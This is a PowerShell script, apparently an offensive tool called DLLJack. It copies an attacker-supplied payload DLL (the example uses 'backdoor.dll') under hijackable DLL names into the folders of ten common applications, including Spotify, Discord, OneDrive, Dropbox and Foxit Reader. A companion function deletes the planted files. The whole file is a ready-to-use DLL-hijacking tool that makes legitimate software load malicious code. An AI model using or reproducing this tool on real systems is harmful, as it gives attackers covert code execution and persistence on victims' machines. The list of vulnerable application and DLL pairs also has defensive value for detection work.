Function DLLJack{
<#
.SYNOPSIS
Main function that has several dll hijacks ready

.DESCRIPTION
DLLJack is a powershell script with preconfigured hijackable dlls in common applications

.PARAMETER AppName
Specifies a preconfigured application with hijackable dl

.PARAMETER DLLPath
Specifies the path to your payload (dll)

.EXAMPLE
DLLJack -AppName discord -DLLPath c:\backdoor.dll
CleanHijacks 
#>

    Param(
    [parameter(Mandatory=$true)]
    [String]
    $AppName,
    [parameter(Mandatory=$true)]
    [String]
    $DLLPath
    )

if ($AppName -eq "Spotify") {copy $DLLPath C:\Users\$env:username\AppData\Roaming\Spotify\mfplat.dll}
elseif ($AppName -eq "Discord") {copy $DLLPath C:\Users\$env:username\AppData\Local\Discord\app-0.0.300\mf.dll}
elseif ($AppName -eq "Hipchat") {copy $DLLPATH C:\Users\$env:username\AppData\Local\Microsoft\WindowsApps\dxtn.dll}
elseif ($AppName -eq "Flux") {copy $DLLPath C:\Users\$env:username\AppData\Local\FluxSoftware\Flux\dxva2.dll}
elseif ($AppName -eq "Onedrive") {copy $DLLPath C:\Users\$env:username\AppData\Local\Microsoft\OneDrive\msfte.dll}
elseif ($AppName -eq "Audacity") {copy $DLLPath C:\Users\$env:username\AppData\Roaming\audacity\Plug-Ins\sc4_1882.dll}
elseif ($AppName -eq "Evernote") {copy $DLLPath 'C:\Program Files (x86)\Evernote\Evernote\RICHED20.dll'}
elseif ($AppName -eq "Dropbox") {copy $DLLPath 'C:\Program Files (x86)\Dropbox\Client\sfc.dll'}
elseif ($AppName -eq "Hipchat2") {copy $DLLPATH 'C:\Program Files (x86)\Atlassian\HipChat4\dxtn.dll'}
elseif ($AppName -eq "Foxit") {copy $DLLPath 'C:\Program Files (x86)\Foxit Software\Foxit Reader\RICHED20.dll'}

else {Write-Host "No entries for $AppName"}

}

Function CleanHijacks{
del C:\Users\$env:username\AppData\Roaming\Spotify\mfplat.dll -ErrorAction SilentlyContinue
del C:\Users\$env:username\AppData\Local\Discord\app-0.0.300\mf.dll -ErrorAction SilentlyContinue
del C:\Users\$env:username\AppData\Local\Microsoft\WindowsApps\dxtn.dll -ErrorAction SilentlyContinue
del C:\Users\$env:username\AppData\Local\FluxSoftware\Flux\dxva2.dll -ErrorAction SilentlyContinue
del C:\Users\$env:username\AppData\Local\Microsoft\OneDrive\msfte.dll -ErrorAction SilentlyContinue
del C:\Users\$env:username\AppData\Roaming\audacity\Plug-Ins\sc4_1882.dll -ErrorAction SilentlyContinue
del 'C:\Program Files (x86)\Atlassian\HipChat4\dxtn.dll' -ErrorAction SilentlyContinue
del 'C:\Program Files (x86)\Dropbox\Client\sfc.dll' -ErrorAction SilentlyContinue
del 'C:\Program Files (x86)\Evernote\Evernote\RICHED20.dll' -ErrorAction SilentlyContinue
del 'C:\Program Files (x86)\Foxit Software\Foxit Reader\RICHED20.dll' -ErrorAction SilentlyContinue
Write-Host 'Hijacks have been removed'
}
